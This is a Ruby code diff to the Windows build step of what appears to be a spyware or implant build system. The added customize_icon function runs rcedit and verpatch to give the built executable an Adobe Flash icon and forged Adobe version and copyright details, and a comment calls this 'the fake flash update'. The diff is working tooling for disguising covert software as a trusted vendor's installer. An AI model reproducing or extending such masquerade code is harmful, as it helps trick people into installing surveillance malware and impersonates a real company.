@@ -166,6 +166,8 @@ class BuildWindows < Build
     case melting_mode
       when :silent
         silent()
+        # needed for the fake flash update
+        customize_icon(path('output'), params['icon']) if params['icon'] and not @scout
       when :cooked
         # this is a build for the NI
         cook()
@@ -416,6 +418,21 @@ class BuildWindows < Build
     # sign it
     CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('scout')}" if to_be_signed?
   end
+
+  def customize_icon(file, icon)
+    case icon
+      when 'flash'
+        icon_file = "icons/#{icon}.ico"
+        info = {name: 'FlashUtil', version: '11.5.500.104', desc: 'Adobe Flash Player Installer/Uninstaller 11.5 r500', company: 'Adobe Systems Incorporated', copyright: 'Copyright (c) 1996 Adobe Systems Incorporated'}
+    end
+
+    # change the icon
+    CrossPlatform.exec path('rcedit'), "/I #{file} #{path(icon_file)}"
+
+    # change the infos
+    CrossPlatform.exec path('verpatch'), "/fn /va #{file} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
+  end
+
 end
 
 end #DB::
